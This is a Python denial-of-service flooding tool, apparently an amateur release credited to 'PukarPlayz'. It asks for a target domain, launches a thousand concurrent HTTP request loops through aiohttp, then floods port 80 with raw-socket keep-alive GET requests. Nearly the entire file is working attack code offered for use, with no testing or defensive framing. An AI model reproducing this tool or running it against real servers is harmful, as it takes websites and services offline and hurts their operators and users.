import os
import asyncio
import aiohttp
from colorama import init, Fore
import logging
import time
import socket


logging.basicConfig(level=logging.INFO)

async def ddos_attack_aiohttp(target_url: str, num_requests: int, session: aiohttp.ClientSession):
    for _ in range(num_requests):
        try:
            async with session.get(target_url) as resp:
                if resp.status != 200:
                    logging.warning(f"Request failed with status code: {resp.status}")
        except aiohttp.ClientError as e:
            logging.error(f"An error occurred during attack: {e}")

async def main_aiohttp(target_url: str, num_requests: int, max_concurrency: int):
    init()
    print("")
    print("")
    print("\033[1;31m    _____ ______ _   _ _______ \033[0m")
    print("\033[1;31m   / ____|  ____| \ | |__   __| \033[0m")
    print("\033[1;31m  | (___ | |__  |  \| |  | |   \033[0m")
    print("\033[1;31m   \___ \|  __| | . ` |  | |    \033[0m")
    print("\033[1;31m   ____) | |____| |\  |  | |  \033[0m")
    print("\033[1;31m  |_____/|______|_| \_|  |_|     \033[0m")
    print("")
    print("\033[1;31m[MADE BY] \033[1;37m PukarPlayz ")
    print("")
    print(Fore.WHITE + f"     Attacking Details")
    print("")
    print(Fore.RED + f"     Target Domain/IP: {target_url}")
    print(Fore.RED + f"     Traffic Per Second: {num_requests}")
    print(Fore.RED + f"     Method: TCP")
    print(Fore.RED + f"     Accurecy : {max_concurrency}")
    print("")
    logging.info(f"\033[1;31m[Warning] \033[1;37m Attacking Server {target_url}")
    
    async with aiohttp.ClientSession() as session:
        try:
            tasks = []
            for _ in range(max_concurrency):
                task = ddos_attack_aiohttp(target_url, num_requests, session)
                tasks.append(task)
            
            await asyncio.gather(*tasks, return_exceptions=True)
        except Exception as e:
            logging.error(f"An error occurred with  {e}")
def ddos_attack_socket(target_url: str, num_requests: int):
    for _ in range(num_requests):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_url, 80))
            s.send(f"GET / HTTP/1.1\r\nHost: {target_url}\r\nConnection: keep-alive\r\n\r\n".encode())
            s.send(f"GET / HTTP/1.1\r\nHost: {target_url}\r\nConnection: keep-alive\r\n\r\n".encode())
            s.send(f"GET / HTTP/1.1\r\nHost: {target_url}\r\nConnection: keep-alive\r\n\r\n".encode())
            s.send(f"GET / HTTP/1.1\r\nHost: {target_url}\r\nConnection: keep-alive\r\n\r\n".encode())
            s.send(f"GET / HTTP/1.1\r\nHost: {target_url}\r\nConnection: keep-alive\r\n\r\n".encode())
            s.send(f"GET / HTTP/1.1\r\nHost: {target_url}\r\nConnection: keep-alive\r\n\r\n".encode())
            s.send(f"GET / HTTP/1.1\r\nHost: {target_url}\r\nConnection: keep-alive\r\n\r\n".encode())
            s.send(f"GET / HTTP/1.1\r\nHost: {target_url}\r\nConnection: keep-alive\r\n\r\n".encode())
            s.send(f"GET / HTTP/1.1\r\nHost: {target_url}\r\nConnection: keep-alive\r\n\r\n".encode())
            s.send(f"GET / HTTP/1.1\r\nHost: {target_url}\r\nConnection: keep-alive\r\n\r\n".encode())
            s.send(f"GET / HTTP/1.1\r\nHost: {target_url}\r\nConnection: keep-alive\r\n\r\n".encode())
            s.send(f"GET / HTTP/1.1\r\nHost: {target_url}\r\nConnection: keep-alive\r\n\r\n".encode())
            s.send(f"GET / HTTP/1.1\r\nHost: {target_url}\r\nConnection: keep-alive\r\n\r\n".encode())
            s.send(f"GET / HTTP/1.1\r\nHost: {target_url}\r\nConnection: keep-alive\r\n\r\n".encode())
            s.send(f"GET / HTTP/1.1\r\nHost: {target_url}\r\nConnection: keep-alive\r\n\r\n".encode())
            s.send(f"GET / HTTP/1.1\r\nHost: {target_url}\r\nConnection: keep-alive\r\n\r\n".encode())
            s.send(f"GET / HTTP/1.1\r\nHost: {target_url}\r\nConnection: keep-alive\r\n\r\n".encode())
            s.send(f"GET / HTTP/1.1\r\nHost: {target_url}\r\nConnection: keep-alive\r\n\r\n".encode())
            s.send(f"GET / HTTP/1.1\r\nHost: {target_url}\r\nConnection: keep-alive\r\n\r\n".encode())
            s.send(f"GET / HTTP/1.1\r\nHost: {target_url}\r\nConnection: keep-alive\r\n\r\n".encode())
            s.send(f"GET / HTTP/1.1\r\nHost: {target_url}\r\nConnection: keep-alive\r\n\r\n".encode())
            s.close()
        except Exception as e:
            logging.error(f"An error occurred during socket-based DDoS attack: {e}")

def main_socket(target_url: str, num_requests: int):
    logging.info(f"Attacking the Server {target_url}")
    start_time = time.time()
    ddos_attack_socket(target_url, num_requests)
    end_time = time.time()
    logging.info(f"Socket-based DOS attack completed in {end_time - start_time} seconds.")

if __name__ == "__main__":
    init()
    print("")
    print("")
    print("\033[1;31m    ____                 _         _____ ____ ____ \033[0m")
    print("\033[1;31m   |  _ \ __ _ _ __   __| | __ _  |_   _/ ___|  _ \ \033[0m")
    print("\033[1;31m   | |_) / _` | '_ \ / _` |/ _` |   | || |   | |_) |\033[0m")
    print("\033[1;31m   |  __/ (_| | | | | (_| | (_| |   | || |___|  __/ \033[0m")
    print("\033[1;31m   |_|   \__,_|_| |_|\__,_|\__,_|   |_| \____|_| \033[0m")
    print("\033[1;31m[MADE BY] \033[1;37m PukarPlayz ")
    target_url = input("Enter Target Domain: ")
    os.system("cls")
    num_requests = 100000
    max_concurrency = 1000

    start_time_aiohttp = time.time()
    asyncio.run(main_aiohttp(target_url, num_requests, max_concurrency))
    end_time_aiohttp = time.time()
    logging.info(f"aiohttp-based DOS attack completed in {end_time_aiohttp - start_time_aiohttp} seconds.")

    start_time_socket = time.time()
    main_socket(target_url, num_requests)
    end_time_socket = time.time()
    logging.info(f"Socket-based DOS attack completed in {end_time_socket - start_time_socket} seconds.")
